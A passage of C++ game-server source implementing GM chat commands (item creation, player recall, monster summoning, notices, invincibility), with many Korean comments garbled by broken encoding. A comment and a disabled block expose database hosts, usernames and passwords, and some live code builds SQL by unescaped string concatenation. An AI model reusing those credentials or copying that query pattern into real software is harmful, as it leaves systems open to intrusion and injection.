            "[OPCREATE-REJECT] isPossibleItem=false ItemClass=%d ItemType=%d",
            (int)ItemClass, (int)ItemType);
    // cerr << "Cannot create item" << endl;
    StringStream msg;
    msg << g_pStringPool->getString(STRID_CANNOT_CREATE_ITEM_2)
        << ItemClass2ShortString[ItemClass] << ", " << (int)ItemType << ", "
        << getOptionTypeToString(optionTypes);

    GCSystemMessage gcSystemMessage;
    gcSystemMessage.setMessage(msg.toString().c_str());

    pGamePlayer->sendPacket(&gcSystemMessage);

    return;
  }

  // cout << "createItemOptions : " << getOptionTypeToString(optionTypes) <<
  // endl;
  //  create� ��  �� �  켼��?
  ItemInfo *pItemInfo = g_pItemInfoManager->getItemInfo(ItemClass, ItemType);
  Assert(pItemInfo != NULL);

  //  �� 경�
  /*
  if (pItemInfo->isUnique())
  {
          if (!UniqueItemManager::isPossibleCreate( ItemClass, ItemType ))
          {
                  GCSystemMessage gcSystemMessage;
                  gcSystemMessage.setMessage(" �� �   
  ��.");

                  pGamePlayer->sendPacket( &gcSystemMessage );

                  return;
          }
  }
  */

  Item *pItem = g_pItemFactoryManager->createItem((Item::ItemClass)ItemClass,
                                                  ItemType, optionTypes);
  pItem->setCreateType(Item::CREATE_TYPE_CREATE);
  pItem->setNum(1);
  pItem->setThirdOptionType(ThirdOptionTypes);

  if (ItemClass == Item::ITEM_CLASS_PET_ITEM) {
    // 1203 wlzzi
    PetType_t runtimePetType = getRuntimePetTypeForItem( ItemType );
    PetTypeInfo *pPetTypeInfo =
        PetTypeInfoManager::getInstance()->getPetTypeInfo(runtimePetType);
    int petCreatureType = 432;
    if (pPetTypeInfo)
      petCreatureType = pPetTypeInfo->getPetCreatureType(1);
    //

    PetInfo *pPetInfo = new PetInfo;
    pPetInfo->setPetType(runtimePetType);
    //		pPetInfo->setPetCreatureType( 432 );
    pPetInfo->setPetCreatureType(petCreatureType);
    pPetInfo->setPetLevel(1);
    pPetInfo->setPetExp(0);
    pPetInfo->setPetHP(1000);
    pPetInfo->setPetAttr(0xff);
    pPetInfo->setPetOption(0);
    pPetInfo->setFoodType(0);
    pPetInfo->setFeedTime(VSDateTime::currentDateTime());
    // 1203 wlzzi
    // FAZ 4 (2026-05-04 oturum 3): NULL guard. g_pPetItemInfoManager->
    // getItemInfo(ItemType) bilinmeyen ItemType (orn. wolverine) icin NULL
    // donebiliyor → pPetItemInfo->getDefaultOptions() segfault. Defansif:
    // NULL ise default 0 option set, GM'a private uyari, item yine de
    // yaratilir (just no defaults).
    PetItemInfo *pPetItemInfo = dynamic_cast<PetItemInfo *>(
        g_pPetItemInfoManager->getItemInfo(ItemType));
    if (pPetItemInfo != NULL) {
      pPetInfo->setOptionType(pPetItemInfo->getDefaultOptions());
    } else {
      filelog("opcreateError.log",
              "[%s] PET_ITEM Type=%d: pPetItemInfo NULL — default options skipped",
              pCreature->getName().c_str(), (int)ItemType);
      // Private warning to GM
      char warnMsg[256];
      snprintf(warnMsg, sizeof(warnMsg),
               "[GM Create] Pet Item Type=%d unknown to PetItemInfoManager — "
               "item created without default options.",
               (int)ItemType);
      GCSystemMessage gcWarn;
      gcWarn.setMessage(warnMsg);
      pGamePlayer->sendPacket(&gcWarn);
    }
    //
    PetItem *pPetItem = dynamic_cast<PetItem *>(pItem);
    if (pPetItem != NULL) {
      pPetItem->setPetInfo(pPetInfo);
      pPetInfo->setPetItem(pPetItem);
    } else {
      cout << "-_-;;;;" << endl;
      // FAZ 4 (audit): pPetInfo leak guard — setPetItem cagrilmaz ise
      // owner'sız PetInfo, delete edip kaldir.
      delete pPetInfo;
      pPetInfo = NULL;
    }
  }

  // cout << "createItemOptions : " <<
  // getOptionTypeToString(pItem->getOptionTypeList()) << endl;

  if (isStackable(pItem->getItemClass()) && lNum < rNum) {
    int itemNum = atoi(msg.substr(lNum + 1, rNum - lNum - 1).c_str());

    itemNum = max(1, min(itemNum, ItemMaxStack[pItem->getItemClass()]));

    pItem->setNum(itemNum);
  }

  Assert(pItem != NULL);

  Zone *pZone = pCreature->getZone();

  ObjectRegistry &objectregistery = pZone->getObjectRegistry();
  objectregistery.registerObject(pItem);

  GCCreateItem gcCreateItem;

  if (pCreature->isPC()) {
    PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);

    Inventory *pInventory = pPC->getInventory();

    Assert(pInventory != NULL);

    TPOINT p;

    if (pInventory->getEmptySlot(pItem, p)) {
      // FAZ 4 (2026-05-04): Defensive wrapper around item creation + DB
      // INSERT. Pre-check above blocks the known overflow path; this catch
      // covers any future DB schema drift or unexpected DB errors so server
      // never aborts on a single GM mistake. Private error message to GM
      // (sendPacket is unicast); disconnect prevented.
      try {
        pInventory->addItem(p.x, p.y, pItem);

        // 2006 10 09 ContractOfBlood
        if (checkContractOfBlood(pItem)) {
          pPC->initAllStatAndSend();
        }

        // checkContractOfBlood(pPC, pItem, p.x, p.y,
        // pInventory->getContractOfBlood() );

        if (lGrade < rGrade) {
          int grade = atoi(msg.substr(lGrade + 1, rGrade - lGrade - 1).c_str());
          pItem->setGrade(grade);
        }

        pItem->create(pPC->getName(), STORAGE_INVENTORY, 0, p.x, p.y);
        pItem->whenPCTake(pPC);

        if (lTime < rTime) {
          int time = atoi(msg.substr(lTime + 1, rTime - lTime - 1).c_str());
          if (time > 0) {
            pPC->addTimeLimitItem(pItem, time);
            pPC->sendTimeLimitItemInfo();
          }
          // by rallser  no time limit
          else {
            // pPC->addTimeLimitItem( pItem, 2592000 );
            // pPC->sendTimeLimitItemInfo();
          }
        } else {
          pPC->addTimeLimitItem(pItem, 2592000);
          pPC->sendTimeLimitItemInfo();
        }

        makeGCCreateItem(&gcCreateItem, pItem, p.x, p.y);
        pGamePlayer->sendPacket(&gcCreateItem);
      } catch (Exception &e) {
        char errMsg[512];
        snprintf(errMsg, sizeof(errMsg),
                 "[GM Create] Failed (server error): %s. class=%d type=%d. "
                 "Item not added; check params or contact dev.",
                 e.toString().c_str(), (int)ItemClass, (int)ItemType);
        GCSystemMessage gcErr;
        gcErr.setMessage(errMsg);
        pGamePlayer->sendPacket(&gcErr);
        filelog("opcreateError.log",
                "[%s] Exception class=%d type=%d msg=%s",
                pPC->getName().c_str(), (int)ItemClass, (int)ItemType,
                e.toString().c_str());
        try {
          pInventory->deleteItem(p.x, p.y);
        } catch (...) {
        }
        SAFE_DELETE(pItem);
        return;
      } catch (std::exception &e) {
        char errMsg[512];
        snprintf(errMsg, sizeof(errMsg),
                 "[GM Create] Failed (std exception): %s. class=%d type=%d. "
                 "Item not added.",
                 e.what(), (int)ItemClass, (int)ItemType);
        GCSystemMessage gcErr;
        gcErr.setMessage(errMsg);
        pGamePlayer->sendPacket(&gcErr);
        filelog("opcreateError.log",
                "[%s] std::exception class=%d type=%d msg=%s",
                pPC->getName().c_str(), (int)ItemClass, (int)ItemType,
                e.what());
        try {
          pInventory->deleteItem(p.x, p.y);
        } catch (...) {
        }
        SAFE_DELETE(pItem);
        return;
      } catch (...) {
        GCSystemMessage gcErr;
        gcErr.setMessage(
            "[GM Create] Failed (unknown error). Item not added; check "
            "gameserver log for details.");
        pGamePlayer->sendPacket(&gcErr);
        filelog("opcreateError.log",
                "[%s] unknown exception class=%d type=%d",
                pPC->getName().c_str(), (int)ItemClass, (int)ItemType);
        try {
          pInventory->deleteItem(p.x, p.y);
        } catch (...) {
        }
        SAFE_DELETE(pItem);
        return;
      }
    } else {
      // cerr << "�� 창조 ������" << endl;
      SAFE_DELETE(pItem);
    }
  }
  /*	else if ( pCreature->isVampire() )
          {
                  Vampire* pVampire= dynamic_cast<Vampire*>(pCreature);

                  Inventory* pInventory = pVampire->getInventory();

                  Assert(pInventory != NULL);

                  TPOINT p;

                  if (pInventory->getEmptySlot(pItem, p))
                  {
                          pInventory->addItem(p.x, p.y, pItem);

                          makeGCCreateItem( &gcCreateItem, pItem, p.x, p.y );

                          pGamePlayer->sendPacket(&gcCreateItem);

                          pItem->create(pVampire->getName(), STORAGE_INVENTORY,
     0, p.x, p.y);
                  }
                  else
                  {
                          //cout << "�� 창조 ������" << endl;
                          SAFE_DELETE(pItem);
                  }
          }
          else if ( pCreature->isOusters() )
          {
                  Ousters* pOusters= dynamic_cast<Ousters*>(pCreature);

                  Inventory* pInventory = pOusters->getInventory();

                  Assert(pInventory != NULL);

                  TPOINT p;

                  if (pInventory->getEmptySlot(pItem, p))
                  {
                          pInventory->addItem(p.x, p.y, pItem);

                          makeGCCreateItem( &gcCreateItem, pItem, p.x, p.y );

                          pGamePlayer->sendPacket(&gcCreateItem);

                          pItem->create(pOusters->getName(), STORAGE_INVENTORY,
     0, p.x, p.y);
                  }
                  else
                  {
                          //cout << "�� 창조 ������" << endl;
                          SAFE_DELETE(pItem);
                  }
          }*/

  if (pItem != NULL) {
    if (isRelicItem(pItem)) {
      addRelicEffect(pCreature, pItem);
    }

    //  �� 경� � 체�����.
    if (pItemInfo->isUnique()) {
      pItem->setUnique();
      // UniqueItemManager::createItem( ItemClass, ItemType );
      filelog("uniqueItem.txt", "[OpCreate] %s %s",
              pCreature->getName().c_str(), pItem->toString().c_str());
    }

    // �그� �긴.
    Statement *pStmt = NULL;
    BEGIN_DB {
      StringStream sql;
      sql << "INSERT INTO OpCreate (OpName, DateTime, ItemDesc) VALUES ("
          << "'" << pCreature->getName() << "',"
          << "'" << VSDateTime::currentDateTime().toString() << "',"
          << "'" << pItem->toString() << "'"
          << ")";

      pStmt = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
      pStmt->executeQuery(sql.toString());
      SAFE_DELETE(pStmt);
    }
    END_DB(pStmt);

    if (pItem != NULL && pItem->isTraceItem()) {
      remainTraceLog(pItem, "GOD", pCreature->getName(), ITEM_LOG_CREATE,
                     DETAIL_COMMAND);
    }
  }

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opgrant(GamePlayer *pGamePlayer, string msg,
                           int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  Creature *pCreature = pGamePlayer->getCreature();

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);

  BYTE Competence = atoi(msg.substr(j + 1, k - j - 1).c_str());

  Zone *pZone = pCreature->getZone();

  string Name = msg.substr(k + 1, msg.size() - k - 1).c_str();

  Creature *pTargetCreature = NULL;

  // try
  //{
  pTargetCreature = pZone->getCreature(Name);

  // NoSuch�. by sigi. 2002.5.2
  if (pTargetCreature != NULL) {
    if (pTargetCreature->isSlayer()) {
      Slayer *pSlayer = dynamic_cast<Slayer *>(pTargetCreature);
      pSlayer->setCompetence(Competence);
      // cout << "set new Competence : " << (int)pSlayer->getCompetence() <<
      // endl;
    } else if (pTargetCreature->isVampire()) {
      Vampire *pVampire = dynamic_cast<Vampire *>(pTargetCreature);
      pVampire->setCompetence(Competence);
      // cout << "set new Competence : " << (int)pVampire->getCompetence() <<
      // endl;
    } else if (pTargetCreature->isOusters()) {
      Ousters *pOusters = dynamic_cast<Ousters *>(pTargetCreature);
      pOusters->setCompetence(Competence);
      // cout << "set new Competence : " << (int)pOusters->getCompetence() <<
      // endl;
    }
  }
  //}
  // catch (NoSuchElementException& nsee)
  //{
  // cout << nsee.toString() << endl;
  //	pTargetCreature = NULL;
  //}

  // cout << "Creature Name : " << Name << endl;

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::oprecall(GamePlayer *pGamePlayer, string msg,
                            int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  Creature *pCreature = pGamePlayer->getCreature();

  PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);
  if (pPC->isPLAYER()) {
    if (g_pGuildManager->isGuildMaster(pPC->getGuildID(), pPC)) {
      if (!SiegeManager::Instance().isSiegeZone(pPC->getZoneID())) {
        return;
      }
    } else {
      return;
    }
  }

  // Zone* pCallZone = pCreature->getZone();

  /*
  size_t j = msg.find_first_of(' ' , i+1);

  string Name = msg.substr(j+1, msg.size()-j-1).c_str();
  */

  Creature *pTCreature = NULL;

  size_t j = msg.find_first_of(' ', i + 1);

  string Name;

  while (j < msg.size()) {
    i = msg.find_first_of(' ', j + 1);

    Name = msg.substr(j + 1, i - j - 1).c_str();

    // cout << "Name : (" <<  Name << ")" << endl;

    // NoSuch�. by sigi. 2002.5.2
    __ENTER_CRITICAL_SECTION((*g_pPCFinder))

    pTCreature = g_pPCFinder->getCreature_LOCKED(Name);

    if (pTCreature == NULL) {
      g_pPCFinder->unlock();
      return;
    }

    // if (pTCreature != NULL)
    {
      // � PCFinder 찾� Creature const��.
      Zone *pTargetZone = pTCreature->getZone();

      Assert(pTargetZone != NULL);

      Creature *pTargetCreature = NULL;
      // try
      //{
      //  NoSuch�. by sigi. 2002.5.2
      pTargetCreature = pTargetZone->getCreature(pTCreature->getObjectID());
      //}
      // catch (NoSuchElementException)
      //{
      //}

      if (pTargetCreature != NULL) {
        //  죽��  �리�   .
        if (pTargetCreature->isEffect(Effect::EFFECT_CLASS_COMA)) {
          g_pPCFinder->unlock();
          return;
        }

        //  존과 �.
        ZoneID_t ZoneNum = pCreature->getZoneID();
        Coord_t ZoneX = pCreature->getX();
        Coord_t ZoneY = pCreature->getY();

        if (SiegeManager::Instance().isSiegeZone(pPC->getZoneID())) {
          Effect::EffectClass eClass = Effect::EFFECT_CLASS_MAX;
          if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_DEFENDER)) {
            ZoneX = 172;
            ZoneY = 38;
            eClass = Effect::EFFECT_CLASS_SIEGE_DEFENDER;
          } else if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_REINFORCE)) {
            ZoneX = 172;
            ZoneY = 38;
            eClass = Effect::EFFECT_CLASS_SIEGE_REINFORCE;
          } else if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_ATTACKER_1)) {
            ZoneX = 20;
            ZoneY = 232;
            eClass = Effect::EFFECT_CLASS_SIEGE_ATTACKER_1;
          } else if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_ATTACKER_2)) {
            ZoneX = 20;
            ZoneY = 232;
            eClass = Effect::EFFECT_CLASS_SIEGE_ATTACKER_2;
          } else if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_ATTACKER_3)) {
            ZoneX = 20;
            ZoneY = 232;
            eClass = Effect::EFFECT_CLASS_SIEGE_ATTACKER_3;
          } else if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_ATTACKER_4)) {
            ZoneX = 20;
            ZoneY = 232;
            eClass = Effect::EFFECT_CLASS_SIEGE_ATTACKER_4;
          } else if (pCreature->isFlag(Effect::EFFECT_CLASS_SIEGE_ATTACKER_5)) {
            ZoneX = 20;
            ZoneY = 232;
            eClass = Effect::EFFECT_CLASS_SIEGE_ATTACKER_5;
          }

          if (eClass != Effect::EFFECT_CLASS_MAX &&
              !pTargetCreature->isFlag(eClass)) {
            if (!pTargetCreature->isPC() ||
                dynamic_cast<PlayerCreature *>(pTargetCreature)->getGuildID() !=
                    pPC->getGuildID()) {
              g_pPCFinder->unlock();
              return;
            }

            addSimpleCreatureEffect(pTargetCreature, eClass, 72000);
          }
        }

        Assert((int)ZoneX < 256);
        Assert((int)ZoneY < 256);

        Assert(pTargetCreature->isPC());

        transportCreature(pTargetCreature, ZoneNum, ZoneX, ZoneY, false);
      }
    }

    __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

    j = i;
  }

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opmrecall(GamePlayer *pGamePlayer, string msg,
                             int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opnotice(GamePlayer *pGamePlayer, string msg,
                            int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      // ============================================================
      // 2026-05-09 SECURITY: hard-coded MySQL credential leak kapatildi.
      // Eski kod 211.117.52.124:3306 (Korean BBS server) icin
      // user=elcastle pass=elca005 ile aciktan baglaniyordu, ayrica
      // SQL injection acigi: noticemsg parametresi escape edilmiyordu.
      // Komut artik no-op; yetkili admin'ler GCNotice/GCSystemMessage
      // kullanabilir.
      // ============================================================
      if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL) {
      filelog("admin.log",
              "opnotice: DISABLED (BBS credential leak) caller=%s msg=%s",
              pCreature->getName().c_str(), msg.c_str());
    }
  }

#if 0
  // Creature* pCreature = pGamePlayer->getCreature();

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);

  string noticemsg = msg.substr(j + 1, k - j - 1).c_str();

  StringStream sql;

  sql << "INSERT INTO quick1001 (content) VALUES (" << noticemsg << ")";

  Connection *pConnection = new Connection("192.168.1.6", "lewo",
                                           "lewo", "lewo", 3306);
  Statement *pStmt = pConnection->createStatement();
  pStmt->executeQuery(sql.toString());

  SAFE_DELETE(pStmt);
  SAFE_DELETE(pConnection);
#endif

  __END_DEBUG_EX __END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opsummon(GamePlayer *pGamePlayer, string msg,
                            int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer == NULL) return;

  Creature *pCreature = pGamePlayer->getCreature();

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1); // j~k : name
  size_t l = msg.find_first_of(' ', k + 1); // k~l : num
  size_t m = msg.find_first_of(' ', l + 1); // l~m : mad

  size_t o = msg.find_first_of('{', j);
  size_t p = msg.find_first_of('}', j + 1);

#ifdef __UNDERWORLD__

  size_t e = msg.find_first_of('[', i + 1);
  size_t v = msg.find_first_of(']', i + 1); // e~v : event ��

  string EventFlag = msg.substr(e + 1, v - e - 1);

  if (strstr(EventFlag.c_str(), "EventAll") != NULL) {
    //	Event code (even the monster types are just hardcoded -_-;)
    Zone *pZone = pCreature->getZone();
    Coord_t ZoneX = pCreature->getX();
    Coord_t ZoneY = pCreature->getY();

    TPOINT pt;

    pt = findSuitablePosition(pZone, ZoneX, ZoneY, Creature::MOVE_MODE_WALKING);

    if (pt.x == -1 || (pZone->getZoneLevel(pt.x, pt.y) & SAFE_ZONE))
      return;

    Monster *pMonster = NULL;
    Monster *pMonster1 = NULL;
    Monster *pMonster2 = NULL;

    try {
      pMonster = new Monster(599);
      pMonster1 = new Monster(599);
      pMonster2 = new Monster(599);

      if (pMonster == NULL)
        return;

      pMonster->setName("Underworld");

      pMonster->setTreasure(true);
      pMonster->setUnderworld(true);

      pMonster1->setTreasure(true);
      pMonster2->setTreasure(true);

      pMonster->setClanType(CLAN_VAMPIRE_MONSTER);
      pMonster1->setClanType(CLAN_VAMPIRE_MONSTER);
      pMonster2->setClanType(CLAN_VAMPIRE_MONSTER);

      pZone->addCreature(pMonster, pt.x, pt.y, Directions(rand() % 8));
      pZone->addCreature(pMonster1, pt.x, pt.y, Directions(rand() % 8));
      pZone->addCreature(pMonster2, pt.x, pt.y, Directions(rand() % 8));

    } catch (...) {
      SAFE_DELETE(pMonster);
      return;
    }

    return;
  } else if (strstr(EventFlag.c_str(), "Event") != NULL) {
    //	�벤�� � (몬���� 그� � -_-;)
    Zone *pZone = pCreature->getZone();
    Coord_t ZoneX = pCreature->getX();
    Coord_t ZoneY = pCreature->getY();

    TPOINT pt;

    pt = findSuitablePosition(pZone, ZoneX, ZoneY, Creature::MOVE_MODE_WALKING);

    if (pt.x == -1 || (pZone->getZoneLevel(pt.x, pt.y) & SAFE_ZONE))
      return;

    Monster *pMonster = NULL;

    try {
      pMonster = new Monster(599);

      if (pMonster == NULL)
        return;

      pMonster->setName("Underworld");

      pMonster->setTreasure(true);
      pMonster->setUnderworld(true);

      pMonster->setClanType(CLAN_VAMPIRE_MONSTER);

      pZone->addCreature(pMonster, pt.x, pt.y, Directions(rand() % 8));

    } catch (...) {
      SAFE_DELETE(pMonster);
      return;
    }

    return;
  }

#endif

  SpriteType_t SpriteType = 0;
  MonsterType_t MonsterType = 0;
  int MonsterNum = 0;

  string MonsterName = msg.substr(j + 1, k - j - 1);

  //	cout << MonsterName << endl;

  // If MonsterType is set instead of SpriteType
  if (o != string::npos && p != string::npos) {
    MonsterType = atoi(msg.substr(o + 1, p - o - 1).c_str());
  } else if (strstr(MonsterName.c_str(), "Chief") != NULL) {
    // Summoning the Chief Monster ㅡ.ㅡ; by DEW
    MonsterType = g_pMonsterInfoManager->getChiefMonsterTypeByName(MonsterName);
  } else {
    SpriteType = g_pMonsterInfoManager->getSpriteTypeByName(MonsterName);

    if (SpriteType == 0) {
      SpriteType = atoi(msg.substr(j + 1, k - j - 1).c_str());
    }
  }

  MonsterNum = atoi(msg.substr(k + 1, msg.size() - k - 1).c_str());

  // 1~30 between
  MonsterNum = max(1, MonsterNum);
  MonsterNum = min(30, MonsterNum);

  // ClanType
  // "mad" monsters -_-;
  string mad = trim(msg.substr(l + 1, m - l - 1));

  SUMMON_INFO summonInfo;
  if (mad == "mad") {
    summonInfo.canScanEnemy = true;

    string group = trim(msg.substr(m + 1, msg.size() - m - 1));

    if (group == "group") {
      summonInfo.clanType = SUMMON_INFO::CLAN_TYPE_RANDOM_GROUP;
      summonInfo.clanID = rand() % 90 + 2;
    } else {
      summonInfo.clanType = SUMMON_INFO::CLAN_TYPE_RANDOM_EACH;
    }
  } else {
    summonInfo.canScanEnemy = false;
    summonInfo.clanType = SUMMON_INFO::CLAN_TYPE_DEFAULT;
  }

  Zone *pZone = pCreature->getZone();
  Coord_t ZoneX = pCreature->getX();
  Coord_t ZoneY = pCreature->getY();

  if (SpriteType == 0 && MonsterType == 0) {
    if (pGamePlayer != NULL) {
      GCSystemMessage gcSystemMessage;
      gcSystemMessage.setMessage("Summon target was not found.");
      pGamePlayer->sendPacket(&gcSystemMessage);
    }

    filelog("summon.txt", "[%s] unresolved summon target: %s",
            pCreature->getName().c_str(), msg.c_str());
    return;
  }

  if (pZone->getZoneLevel() & SAFE_ZONE) {
    if (pGamePlayer != NULL) {
      GCSystemMessage gcSystemMessage;
      gcSystemMessage.setMessage(
          "Summon is not allowed in a safe zone. Move outside town and try again.");
      pGamePlayer->sendPacket(&gcSystemMessage);
    }

    filelog("summon.txt", "[%s] ZoneID=%d, summon blocked in safe zone: %s",
            pCreature->getName().c_str(), pZone->getZoneID(), msg.c_str());
    return;
  }

  try {
    // In a general zone, monsters are spawned.
    filelog("summon.txt", "[%s] ZoneID=%d, %s", pCreature->getName().c_str(),
            pCreature->getZone()->getZoneID(), msg.c_str());

    // monsterInfo 건� 건� 체���� ��..
    // �면 NoSuchElementException ��.
    if (SpriteType != 0) {
      g_pMonsterInfoManager->getMonsterTypeBySprite(SpriteType);
      addMonstersToZone(pZone, ZoneX, ZoneY, SpriteType, MonsterType,
                        MonsterNum, summonInfo);
    } else if (MonsterType != 0) {
      g_pMonsterInfoManager->getMonsterInfo(MonsterType);
      addMonstersToZone(pZone, ZoneX, ZoneY, SpriteType, MonsterType,
                        MonsterNum, summonInfo);
    }
  } catch (Throwable &t) {
    cout << t.toString() << endl;
    filelog("summon.txt", "[%s]%s",
            (pGamePlayer == NULL
                 ? "Nobody"
                 : pGamePlayer->getCreature()->getName().c_str()),
            t.toString().c_str());
  }

  __END_DEBUG_EX __END_CATCH
}

static const Effect::EffectClass FirecrackerEffects[] = {
    Effect::EFFECT_CLASS_FIRE_CRACKER_1,             // 0
    Effect::EFFECT_CLASS_FIRE_CRACKER_2,             // 1
    Effect::EFFECT_CLASS_FIRE_CRACKER_3,             // 2
    Effect::EFFECT_CLASS_DRAGON_FIRE_CRACKER,        // 3
    Effect::EFFECT_CLASS_FIRE_CRACKER_4,             // 4
    Effect::EFFECT_CLASS_FIRE_CRACKER_VOLLEY_1,      // 5
    Effect::EFFECT_CLASS_FIRE_CRACKER_VOLLEY_2,      // 6
    Effect::EFFECT_CLASS_FIRE_CRACKER_VOLLEY_3,      // 7
    Effect::EFFECT_CLASS_FIRE_CRACKER_VOLLEY_4,      // 8
    Effect::EFFECT_CLASS_FIRE_CRACKER_WIDE_VOLLEY_1, // 9
    Effect::EFFECT_CLASS_FIRE_CRACKER_WIDE_VOLLEY_2, // 10
    Effect::EFFECT_CLASS_FIRE_CRACKER_WIDE_VOLLEY_3, // 11
    Effect::EFFECT_CLASS_FIRE_CRACKER_WIDE_VOLLEY_4, // 12
    Effect::EFFECT_CLASS_FIRE_CRACKER_STORM          // 13
};

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
void CGSayHandler::opcommand(GamePlayer *pGamePlayer, string msg,
                             int i) throw(ProtocolException, Error) {
  __BEGIN_TRY __BEGIN_DEBUG_EX

      if (pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL && !pCreature->isGOD() && !pCreature->isDM()) {
      return;
    }
  }

  size_t j = msg.find_first_of(' ', i + 1);
  size_t k = msg.find_first_of(' ', j + 1);
  string command = trim(msg.substr(j + 1, k - j - 1));
  string value1 = msg.substr(k + 1, msg.size() - k - 1).c_str();
  bool bGMOnlinePlayersCommand =
      (command == "gmplayers" || command == "gmgoto");

  if (pGamePlayer != NULL && !bGMOnlinePlayersCommand) {
    Creature *pCreature = pGamePlayer->getCreature();
    filelog("change.txt", "%s , %s , %s", pCreature->getName().c_str(),
            command.c_str(), value1.c_str());
  }

  GCSystemMessage gcSystemMessage;
  gcSystemMessage.setMessage("nothing");
  bool bSendPacket = true;

  if (command == "balanceZoneGroup") {
    bool defaultZoneGroup = false;

    if (value1 == "default")
      defaultZoneGroup = true;

    // �~
    g_pClientManager->setBalanceZoneGroup(0, true, defaultZoneGroup);

    gcSystemMessage.setMessage(
        g_pStringPool->getString(STRID_ZONE_GROUP_BALANCING));
  } else if (command == "regenMasterLair") {
    if (pGamePlayer == NULL)
      return;
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature == NULL)
      return;
    Zone *pZone = pCreature->getZone();
    Assert(pZone != NULL);

    if (pZone->isMasterLair()) {
      // �~
      MasterLairManager *pMasterLairManager = pZone->getMasterLairManager();
      Assert(pMasterLairManager != NULL);

      pMasterLairManager->startEvent();

      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_MASTER_LAIR_REGEN));
    } else {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_NOT_IN_MASTER_LAIR));
    }
  }
  // 2006 12 8
  else if (command == "showSnowmanPartRatio") {
    if (pGamePlayer == NULL)
      return;
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature == NULL)
      return;
    Zone *pZone = pCreature->getZone();
    Assert(pZone != NULL);

    const string &msg = g_pVariableManager->toString(EVENT_SNOW_MAN_PART_RATIO);
    gcSystemMessage.setMessage(msg);
  } else if (command == "showEventBox200612") {
    if (pGamePlayer == NULL)
      return;
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature == NULL)
      return;
    Zone *pZone = pCreature->getZone();
    Assert(pZone != NULL);

    const string &msg = g_pVariableManager->toString(EVENT_BOX_ITEM_200612);
    gcSystemMessage.setMessage(msg);

  } else if (command == "showMasterLairStatus") {
    if (pGamePlayer == NULL)
      return;
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature == NULL)
      return;
    Zone *pZone = pCreature->getZone();
    Assert(pZone != NULL);

    if (pZone->isMasterLair()) {
      MasterLairManager *pMasterLairManager = pZone->getMasterLairManager();
      Assert(pMasterLairManager != NULL);

      gcSystemMessage.setMessage(pMasterLairManager->toString());
    } else {
      gcSystemMessage.setMessage(
          g_pStringPool->getString(STRID_NOT_IN_MASTER_LAIR));
    }
  } else if (command == "invincible") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    bool bInvincible = pCreature->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE);

    if (value1 == "on") {
      char msg[50];
      sprintf(msg, g_pStringPool->c_str(STRID_INVINCIBLE), "ON");

      if (bInvincible)
        gcSystemMessage.setMessage(msg);
      else {
        pCreature->setFlag(Effect::EFFECT_CLASS_NO_DAMAGE);
        gcSystemMessage.setMessage(msg);
      }
      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else if (value1 == "off") {

      char msg[50];
      sprintf(msg, g_pStringPool->c_str(STRID_INVINCIBLE), "OFF");

      StringStream message;
      if (!bInvincible)
        gcSystemMessage.setMessage(msg);
      else {
        pCreature->removeFlag(Effect::EFFECT_CLASS_NO_DAMAGE);
        gcSystemMessage.setMessage(msg);
      }

      filelog("change.txt", "[%s]%s",
              (pGamePlayer == NULL
                   ? "Nobody"
                   : pGamePlayer->getCreature()->getName().c_str()),
              gcSystemMessage.toString().c_str());
    } else {
      bSendPacket = false;
    }
  } else if (command == "ghost") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    bool bGhost = pCreature->isFlag(Effect::EFFECT_CLASS_GHOST);

    if (value1 == "on") {
      char msg[50];
      sprintf(msg, g_pStringPool->c_str(STRID_GHOST), "ON");

      if (bGhost)
        gcSystemMessage.setMessage(msg);
      else {
